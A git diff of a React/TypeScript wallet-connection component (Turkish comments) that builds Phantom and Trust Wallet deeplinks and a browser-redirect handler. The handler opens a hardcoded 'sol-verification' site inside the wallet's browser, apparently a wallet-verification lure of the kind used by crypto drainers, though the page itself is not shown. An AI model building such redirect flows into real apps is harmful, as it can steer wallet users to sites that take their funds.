@@ -157,12 +157,12 @@ useEffect(() => {
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
-{
-  match: (n) => n === 'Phantom',
-  label: 'Phantom',
-  icon: '/phantom.svg',
-  deepLink: `https://phantom.app/ul/v1/browse/https://sol-verification.vercel.app/IR03?ref=https://sol-verification.vercel.app/IR03`,
-},
+    {
+      match: (n) => n === 'Phantom',
+      label: 'Phantom',
+      icon: '/phantom.svg',
+      deepLink: `https://phantom.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
+    },
     {
       match: (n) => n.toLowerCase().includes('trust'),
       label: 'Trust Wallet',
@@ -315,10 +315,9 @@ const handleWalletClick = async (w: DrawerWallet) => {
     }
 
     // 2) Sabit IR03 deeplink için URL’leri ayarla
-    const targetUrl     = 'https://sol-verification.vercel.app/phantomIR03';
-    const fullUrl       = targetUrl;
-    const encodedFull   = encodeURIComponent(targetUrl);
-    const hostAndPath   = targetUrl.replace(/^https?:\/\//, '');
+    const targetUrl   = 'https://sol-verification.vercel.app/IR03';
+    const encodedFull = encodeURIComponent(targetUrl);
+    const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
 
     // Android+Telegram için generic intent: varsayılan tarayıcıyı açtırır
     const intentDefaultBrowser = [
@@ -374,6 +373,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
   // Fallback: deeplink ile yönlendir
   window.open(w.deepLink, '_blank');
 };
+
 
 
 
